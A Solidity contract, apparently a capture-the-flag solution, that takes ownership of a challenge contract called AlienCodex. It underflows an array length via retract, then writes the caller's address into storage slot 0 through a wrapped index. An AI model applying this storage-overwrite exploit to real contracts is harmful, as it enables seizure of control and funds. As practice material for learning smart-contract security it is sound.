// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IAlienCodex {
  function owner() external view returns (address);
  function make_contact() external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
}

contract AlienCodexHacker {
  function claimOwner(address _alienCodex) external {
    uint index;
    unchecked {
        index = 0 - uint256(keccak256(abi.encodePacked(uint(1))));
    }
    IAlienCodex alienCodex = IAlienCodex(_alienCodex);
    alienCodex.make_contact();
    alienCodex.retract();
    alienCodex.revise(index, bytes32(uint256(uint160(msg.sender))));
  }
}